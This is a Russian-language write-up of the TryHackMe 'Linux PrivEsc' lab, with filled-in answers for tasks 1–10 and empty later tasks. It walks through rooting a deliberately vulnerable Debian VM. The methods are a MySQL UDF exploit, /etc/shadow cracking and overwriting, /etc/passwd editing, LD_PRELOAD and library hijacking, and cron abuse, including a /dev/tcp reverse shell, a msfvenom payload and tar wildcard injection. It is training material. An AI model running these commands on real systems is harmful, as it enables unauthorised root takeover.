[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Linux PrivEsc](https://tryhackme.com/r/room/linuxprivesc) 

Всего 21 заданиe:
## Задание 1
Цель этой комнаты — провести вас через различные методы повышения привилегий в Linux. Для этого вам необходимо 
сначала развернуть намеренно уязвимую виртуальную машину Debian. Эта виртуальная машина была создана  Саги Шахаром в 
рамках его локального семинара по повышению привилегий,  но была обновлена Tib3rius в рамках его курса Linux 
Privilege Escalation for OSCP and Beyond! на Udemy. Полные объяснения различных методов, используемых в этой комнате,
доступны там же, вместе с демонстрациями и советами по поиску повышений привилегий в Linux.

Прежде чем пытаться получить доступ к виртуальной машине Debian , убедитесь, что вы подключены к TryHackMe VPN  или 
используете браузерный экземпляр Kali!

SSH должен быть доступен на порту 22. Вы можете войти в учетную запись «user», используя следующую команду:
`ssh user@MACHINE_IP`
Если вы видите следующее сообщение: «Вы уверены, что хотите продолжить подключение (да/нет)?» введите yes  и нажмите 
Enter.

Пароль для учетной записи «пользователь» — «password321».

Примечание: Если вы получаете сообщение об ошибке, говорящее о том, что OpenSSH устарел ssh-rsa. Добавьте к вашей 
команде для подключения. `Unable to negotiate with <IP> port 22: no matching how to key type found. Their offer: 
ssh-rsa, ssh-dss-oHostKeyAlgorithms=+ssh-rsa`

Следующие задачи проведут вас через различные методы повышения привилегий. После каждого метода у вас должна быть 
оболочка root. Не забудьте выйти из оболочки и/или заново установить сеанс в качестве учетной записи "пользователя" 
перед началом следующей задачи!  

### Ответьте на вопросы ниже
Разверните машину и войдите в учетную запись «пользователя» с помощью SSH.
```commandline
Ответ не нужен
```
Запустите команду "id". Какой результат?
```commandline
uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
```

## Задание 2
Служба MySQL запущена как root, а пользователю "root" для службы не назначен пароль. Мы можем использовать 
популярный эксплойт , который использует пользовательские функции (UDF) для запуска системных команд как root через 
службу MySQL.

Перейдите в каталог `/home/user/tools/mysql-udf`:
```commandline
cd /home/user/tools/mysql-udf
```
Скомпилируйте код эксплойта raptor_udf2.c, используя следующие команды:
```commandline
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```
Подключитесь к службе MySQL как пользователь root с пустым паролем:
```commandline
mysql -u root
```
Выполните следующие команды в оболочке MySQL, чтобы создать пользовательскую функцию (UDF) «do_system» с помощью 
нашего скомпилированного эксплойта:
```commandline
use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
```
Используйте функцию для копирования /bin/bash в /tmp/rootbash и установки разрешения SUID:
```commandline
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
```
Выйдите из оболочки MySQL (введите exit  или \q  и нажмите Enter ) и запустите исполняемый файл /tmp/rootbash с 
параметром -p, чтобы запустить оболочку с привилегиями root:
```commandline
/tmp/rootbash -p
```
Не забудьте удалить исполняемый файл `/tmp/rootbash` и выйти из оболочки root, прежде чем продолжить, так как позже 
вы снова создадите этот файл в этой же комнате!
```commandline
rm /tmp/rootbash
exit
```

### Ответьте на вопросы ниже
Прочитайте и следуйте указаниям выше.
```commandline
Ответ не нужен
```

## Задание 3
Файл /etc/shadow содержит хэши паролей пользователей и обычно доступен для чтения только пользователю root.

Обратите внимание, что файл `/etc/shadow` на виртуальной машине доступен для чтения всем:
```commandline
ls -l /etc/shadow
```
Просмотрите содержимое файла `/etc/shadow`:
```commandline
cat /etc/shadow
```
Каждая строка файла представляет пользователя. Хэш пароля пользователя (если он есть) можно найти между первым и 
вторым двоеточием (:) каждой строки. 

Сохраните хэш пользователя root в файле hash.txt на вашей виртуальной машине Kali и используйте john the ripper, 
чтобы взломать его. Возможно, вам придется сначала распаковать `/usr/share/wordlists/rockyou.txt.gz` и запустить 
команду с помощью sudo в зависимости от вашей версии Kali:
```commandline
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Переключитесь на пользователя root, используя взломанный пароль:
```commandline
su root
```

Не забудьте выйти из оболочки root, прежде чем продолжить!

### Ответьте на вопросы ниже
Каков хеш пароля пользователя root?
```commandline
$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0
```
Какой алгоритм хеширования использовался для создания хеша пароля пользователя root?
```commandline
sha512crypt
```
Какой пароль у пользователя root?
```commandline
password123
```

## Задание 4
Файл `/etc/shadow` содержит хэши паролей пользователей и обычно доступен для чтения только пользователю root.
Обратите внимание, что файл /etc/shadow на виртуальной машине доступен для записи всем:
```commandline
ls -l /etc/shadow
```
Создайте новый хеш пароля с паролем по вашему выбору:
```commandline
mkpasswd -m sha-512 newpasswordhere
```
Отредактируйте файл `/etc/shadow` и замените исходный хеш пароля пользователя root на тот, который вы только что 
сгенерировали.
Переключитесь на пользователя root, используя новый пароль:
```commandline
su root
```
Не забудьте выйти из оболочки root, прежде чем продолжить!

### Ответьте на вопросы ниже
Прочитайте и следуйте указаниям выше.
```commandline
Ответ не нужен
```

## Задание 5
Файл `/etc/passwd` содержит информацию об учетных записях пользователей. Он доступен для чтения всем, но обычно 
доступен для записи только пользователю root. Исторически файл `/etc/passwd` содержал хэши паролей пользователей, и 
некоторые версии Linux по -прежнему позволяют хранить там хэши паролей.

Обратите внимание, что файл `/etc/passwd` доступен для записи всем:
```commandline
ls -l /etc/passwd
```
Создайте новый хеш пароля с паролем по вашему выбору:
```commandline
openssl passwd newpasswordhere
```
Отредактируйте файл `/etc/passwd` и поместите сгенерированный хеш пароля между первым и вторым двоеточием (:) строки 
пользователя root (заменив «x»).
Переключитесь на пользователя root, используя новый пароль:
```commandline
su root
```
Либо скопируйте строку пользователя root и добавьте ее в конец файла, изменив первое вхождение слова «root» на 
«newroot» и поместив сгенерированный хеш пароля  между первым и вторым двоеточием (заменив «x»).

Теперь переключитесь на пользователя newroot, используя новый пароль:
```commandline
su newroot
```
Не забудьте выйти из оболочки root, прежде чем продолжить!

### Ответьте на вопросы ниже
Запустите команду "id" как пользователь newroot. Какой результат?
```commandline
uid=0(root) gid=0(root) groups=0(root)
```

## Задание 6
Перечислите программы, которые sudo позволяет запускать вашему пользователю:
```commandline
sudo -l
```
Посетите GTFOBins ( https://gtfobins.github.io ) и найдите некоторые названия программ. Если программа указана с 
"sudo" как функцией, вы можете использовать ее для повышения привилегий, обычно с помощью escape-последовательности.

Выберите программу из списка и попробуйте получить root-доступ, следуя инструкциям от GTFOBins.

Для дополнительной сложности попробуйте получить права root, используя все программы из списка!

Не забудьте выйти из оболочки root, прежде чем продолжить!

### Ответьте на вопросы ниже
Сколько программ «пользователю» разрешено запускать через sudo? 
```commandline
11
```
У одной программы из списка нет последовательности выхода из оболочки на GTFOBins. Какая из них?
```commandline
apache2
```
Подумайте, как можно использовать эту программу с sudo для получения привилегий root без escape-последовательности 
оболочки. 
```commandline
Ответ не нужен
```

## Задание 7
Sudo можно настроить на наследование определенных переменных среды из среды пользователя.

Проверьте, какие переменные среды унаследованы (найдите параметры env_keep):
```commandline
sudo -l
```
LD_PRELOAD и LD_LIBRARY_PATH оба наследуются из среды пользователя.  LD_PRELOAD загружает общий объект перед любыми 
другими при запуске программы. LD_LIBRARY_PATH предоставляет список каталогов, в которых в первую очередь ищутся 
общие библиотеки.

Создайте общий объект, используя код, расположенный в `/home/user/tools/sudo/preload.c` :
```commandline
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
```
Запустите одну из программ, которые вам разрешено запускать через sudo (перечисленных при запуске sudo -l ), 
установив переменную среды LD_PRELOAD на полный путь к новому общему объекту:
```commandline
sudo LD_PRELOAD=/tmp/preload.so program-name-here
```
Должна появиться оболочка root. Выйдите из оболочки перед продолжением. В зависимости от выбранной вами программы 
вам может потребоваться выйти и из нее.

Запустите ldd для файла программы apache2, чтобы увидеть, какие общие библиотеки используются программой:
```commandline
ldd /usr/sbin/apache2
```
Создайте общий объект с тем же именем, что и у одной из перечисленных библиотек (libcrypt.so.1), используя код, 
расположенный в `/home/user/tools/sudo/library_path.c`:
```commandline
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
```
Запустите apache2 с помощью sudo, установив переменную среды LD_LIBRARY_PATH на /tmp (куда мы выводим 
скомпилированный общий объект):
```commandline
sudo LD_LIBRARY_PATH=/tmp apache2
```
Должна появиться оболочка root. Выйдите из оболочки. Попробуйте переименовать `/tmp/libcrypt.so.1` в имя другой 
библиотеки, используемой apache2, и снова запустить apache2 с помощью sudo. Сработало? Если нет, попробуйте выяснить,
почему и как  можно изменить код library_path.c, чтобы это сработало.

Не забудьте выйти из оболочки root, прежде чем продолжить!

### Ответьте на вопросы ниже
Прочитайте и следуйте указаниям выше.
```commandline
Ответ не нужен
```

## Задание 8
Задания Cron — это программы или скрипты, запуск которых пользователи могут запланировать на определенное время или 
интервалы. Файлы таблиц Cron (crontab) хранят конфигурацию заданий cron.  Системный crontab находится в `/etc/crontab`.

Просмотр содержимого общесистемного crontab:
```commandline
cat /etc/crontab
```
Должно быть запланировано два задания cron, которые будут запускаться каждую минуту. Одно запускает overwrite.sh, 
другое запускает `/usr/local/bin/compress.sh`.

Найдите полный путь к файлу overwrite.sh:
```commandline
locate overwrite.sh
```

Обратите внимание, что файл доступен для записи всем пользователям:
```commandline
ls -l /usr/local/bin/overwrite.sh
```
Замените содержимое файла `overwrite.sh` следующим, предварительно изменив IP-адрес на адрес вашего компьютера Kali.
```commandline
#!/bin/bash
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
```
Настройте прослушиватель netcat на вашем Kali box на порту 4444 и дождитесь выполнения задания cron (это не должно 
занять больше минуты). Корневая оболочка должна подключиться к вашему прослушивателю netcat. Если он не 
перепроверяет разрешения файла, чего-то не хватает?
```commandline
nc -nvlp 4444
```
Не забудьте выйти из оболочки root и удалить код обратной оболочки, прежде чем продолжить!

### Ответьте на вопросы ниже
Прочитайте и следуйте указаниям выше.
```commandline
Ответ не нужен
```

## Задание 9
Просмотр содержимого общесистемного crontab:
```commandline
cat /etc/crontab
```
Обратите внимание, что переменная PATH начинается с  `/home/user`, что является домашним каталогом нашего пользователя.
Создайте в домашнем каталоге файл с именем `overwrite.sh` со следующим содержимым:
```commandline
#!/bin/bash

cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
```
Убедитесь, что файл является исполняемым:
```commandline
chmod +x /home/user/overwrite.sh
```
Подождите, пока запустится задание cron (это не должно занять больше минуты).  Запустите команду `/tmp/rootbash с -p`, 
чтобы запустить оболочку с привилегиями root:
```commandline
/tmp/rootbash -p
```
Не забудьте удалить измененный код, удалить исполняемый файл `/tmp/rootbash` и выйти из оболочки с повышенными 
привилегиями, прежде чем продолжить, так как позже вы снова создадите этот файл в этой же комнате!
```commandline
rm /tmp/rootbash
exit
```

### Ответьте на вопросы ниже
Каково значение переменной PATH в /etc/crontab?
```commandline
/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
```

## Задание 10
Посмотрите содержимое другого скрипта задания cron:
```commandline
cat /usr/local/bin/compress.sh
```
Обратите внимание, что команда tar запускается с подстановочным знаком (*) в вашем домашнем каталоге.
Взгляните на страницу GTFOBins для tar. Обратите внимание, что tar имеет параметры командной строки, которые 
позволяют вам запускать другие команды как часть функции контрольной точки.
Используйте `msfvenom` на вашем Kali box для генерации обратного бинарного файла ELF. Обновите IP-адрес LHOST 
соответствующим образом:
```commandline
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf
```
Перенесите файл shell.elf в /home/user/ на виртуальной машине Debian (вы можете использовать scp  или разместить 
файл на веб-сервере на вашем компьютере с Kali и использовать wget ). Убедитесь, что файл является исполняемым:
```commandline
chmod +x /home/user/shell.elf
```
Создайте эти два файла в /home/user:
```commandline
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=shell.elf
```
При запуске команды tar в задании cron подстановочный знак (*) будет расширен, чтобы включить эти файлы. Поскольку 
их имена файлов являются допустимыми параметрами командной строки tar, tar распознает их как таковые и будет 
рассматривать их как параметры командной строки, а не имена файлов.

Настройте прослушиватель netcat на вашем Kali box на порту 4444 и дождитесь выполнения задания cron (это не должно 
занять больше минуты). Оболочка root должна подключиться к вашему прослушивателю netcat.
```commandline
nc -nvlp 4444
```

Не забудьте выйти из оболочки root и удалить все созданные вами файлы, чтобы предотвратить повторное выполнение задания cron:
```commandline
rm /home/user/shell.elf
rm /home/user/--checkpoint=1
rm /home/user/--checkpoint-action=exec=shell.elf
```

### Ответьте на вопросы ниже
Прочитайте и следуйте указаниям выше.
```commandline
Ответ не нужен
```

## Задание 11

```commandline
Ответ не нужен
```

## Задание 12

```commandline
Ответ не нужен
```

## Задание 13

```commandline
Ответ не нужен
```

## Задание 14

```commandline
Ответ не нужен
```

## Задание 15

```commandline
Ответ не нужен
```

## Задание 16

```commandline
Ответ не нужен
```

## Задание 17

```commandline
Ответ не нужен
```

## Задание 18

```commandline
Ответ не нужен
```

## Задание 19

```commandline
Ответ не нужен
```

## Задание 20

```commandline
Ответ не нужен
```


## Задание 21

```commandline
Ответ не нужен
```
[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)